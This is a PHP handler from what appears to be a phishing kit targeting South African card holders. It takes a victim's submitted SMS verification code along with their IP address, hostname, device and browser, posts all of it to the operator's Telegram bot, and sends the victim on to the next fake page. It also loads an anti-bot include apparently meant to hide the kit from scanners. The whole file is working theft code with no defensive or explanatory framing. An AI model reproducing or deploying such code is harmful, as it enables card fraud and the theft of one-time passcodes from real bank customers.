<?php
include("../owner/config.php");
include "../files/php/sys.php";
include '../files/php/911/botfucker.php'; 
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['ovnimdf'] == 'C^7$yzv-=9Tz!!u')){
  $hostname = gethostbyaddr($ip);
    $ovnimsg .= "🇿🇦 C A R D - S M S 🇿🇦\n";
    $ovnimsg .= "🔒 SMS  : ".$_POST['ovnisms']."\n";
    $ovnimsg .= "👀 IP   : $ip\n";
    $ovnimsg .= "🕒 TIME : $date\n";
    $ovnimsg .= "🍝 DEVICE: $user_os\n";
    $ovnimsg .= "🍝 BROWSER: $user_browser\n";
    $ovnimsg .= "❄ #FroZen# ❄ \n";
    $token = "$ovnitoken";
    $data = [
    'text' => $ovnimsg,
    'chat_id' => $ovnichat,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    header("Location: ../9hab.php");}
    else{
      header("Location: ../index.php");}


?>